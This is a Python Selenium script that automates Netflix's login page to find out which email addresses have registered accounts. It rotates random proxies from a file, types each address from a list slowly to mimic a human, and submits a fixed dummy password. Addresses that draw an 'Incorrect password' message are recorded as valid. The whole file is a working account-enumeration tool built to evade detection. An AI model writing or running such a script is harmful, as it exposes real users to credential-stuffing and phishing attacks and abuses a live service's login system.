from selenium import webdriver
from selenium.common.exceptions import *
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.remote.webelement import WebElement
from time import sleep
import random
import json

def Find_Element(driver : webdriver.Chrome, by, value : str) -> WebElement:
    while True:
        try:
            element = driver.find_element(by, value)
            break
        except:
            pass
        sleep(0.1)
    return element

def Find_Elements(driver : webdriver.Chrome, by, value : str) -> list[WebElement]:
    while True:
        try:
            elements = driver.find_elements(by, value)
            if len(elements) > 0:
                break
        except:
            pass
        sleep(0.1)
    return elements

def Send_Keys(element : WebElement, content : str):
    element.clear()
    for i in content:
        element.send_keys(i)
        sleep(0.1)

with open('proxy.json', 'r') as file:
    proxy_datas = json.load(file)
    proxy_data = proxy_datas.get('proxies', [])

proxies = []
for item in proxy_data:
    proxy_address = item['proxy']
    proxies.append(proxy_address)

with open('json.json', 'w') as file:
    json.dump(proxies, file)

with open(f'email.txt', 'r') as file:
    lines = file.readlines()

def main():
    for line_number, line in enumerate(lines, 1):
        options = Options()
        random_proxy = random.choice(proxies)
        options.add_argument(f'--proxy-server=http://{random_proxy}')
        driver = webdriver.Chrome(options = options)
        print(f'Proxy : {random_proxy}')
        print(f'Email{line_number} : {line.strip()}')
        driver.get('https://www.netflix.com/')

        signin_btn = Find_Element(driver, By.CLASS_NAME, 'default-ltr-cache-1clcoym')
        driver.execute_script("arguments[0].click();", signin_btn)

        email_box = Find_Element(driver, By.ID, 'id_userLoginId')
        Send_Keys(email_box, f'{line.strip()}')

        password_box = Find_Element(driver, By.ID, 'id_password')
        Send_Keys(password_box, f'qwe123!@#')

        login_btn = Find_Element(driver, By.CLASS_NAME, 'login-button')
        driver.execute_script("arguments[0].click();", login_btn)

        error_message = Find_Element(driver, By.CLASS_NAME, 'ui-message-contents').text
        print(error_message)

        if error_message == 'Incorrect password. Please try again or you can reset your password.':
            with open('valid_email.txt', 'a') as f:
                f.write(f'{line.strip()}\n')
        else:
            with open('invalid_email.txt', 'a') as f:
                f.write(f'{line.strip()}\n')

if __name__ == "__main__":
    main()